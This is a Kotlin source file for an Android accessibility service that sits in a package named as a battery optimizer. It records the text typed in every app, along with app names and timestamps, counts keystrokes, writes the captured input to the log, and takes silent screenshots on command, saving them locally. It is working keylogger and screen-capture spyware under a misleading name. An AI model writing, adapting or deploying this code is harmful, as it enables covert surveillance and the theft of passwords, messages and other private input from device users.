package com.android.batteryoptimization

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class InputAccessibilityService : AccessibilityService() {

    private lateinit var repository: InputRepository

    private var screenshotReceiver: android.content.BroadcastReceiver? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        repository = InputRepository.getInstance(applicationContext)
        Log.d(TAG, "Accessibility Service Connected")

        val filter = android.content.IntentFilter(ACTION_TAKE_SCREENSHOT)
        screenshotReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                Log.d(TAG, "Received screenshot broadcast in accessibility process")
                takeSilentScreenshot(this@InputAccessibilityService) { _, msg ->
                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                        android.widget.Toast.makeText(this@InputAccessibilityService, msg, android.widget.Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenshotReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenshotReceiver, filter)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        screenshotReceiver?.let { receiver ->
            try {
                unregisterReceiver(receiver)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to unregister receiver", e)
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: "Unknown"
            val appName = getAppName(packageName)
            val text = event.text.joinToString(" ")
            
            // Avoid capturing empty or blank strings unnecessarily
            if (text.isNotBlank()) {
                // Increment keystrokes count in SharedPreferences
                val prefs = applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
                val current = prefs.getInt("total_keystrokes", 0)
                prefs.edit().putInt("total_keystrokes", current + 1).apply()

                val inputEvent = InputEvent(
                    timestamp = System.currentTimeMillis(),
                    packageName = packageName,
                    appName = appName,
                    text = text
                )
                repository.addEvent(inputEvent)
                Log.d(TAG, "Captured input: $text from $packageName")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted")
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val applicationInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    fun takeSilentScreenshot(context: android.content.Context, onResult: (Boolean, String) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                context.mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        try {
                            val hardwareBuffer = screenshot.hardwareBuffer
                            val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                            if (bitmap != null) {
                                val success = saveBitmapToSandbox(context, bitmap)
                                if (success) {
                                    onResult(true, "截屏成功，已保存至沙盒")
                                } else {
                                    onResult(false, "截屏保存失败")
                                }
                            } else {
                                onResult(false, "截屏转换Bitmap失败")
                            }
                            hardwareBuffer.close()
                        } catch (e: Exception) {
                            Log.e(TAG, "Screenshot handling error", e)
                            onResult(false, "截屏处理异常: ${e.message}")
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        onResult(false, "截屏失败，错误码: $errorCode")
                    }
                }
            )
        } else {
            onResult(false, "系统版本过低，静默截屏需要 Android 11 (API 30) 及以上")
        }
    }

    private fun saveBitmapToSandbox(context: android.content.Context, bitmap: android.graphics.Bitmap): Boolean {
        return try {
            val file = java.io.File(context.filesDir, "screenshot_${System.currentTimeMillis()}.png")
            file.outputStream().use { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save screenshot to sandbox", e)
            false
        }
    }

    companion object {
        private const val TAG = "InputAccessibility"
        const val ACTION_TAKE_SCREENSHOT = "com.android.batteryoptimization.ACTION_TAKE_SCREENSHOT"
        var instance: InputAccessibilityService? = null
            private set
    }
}
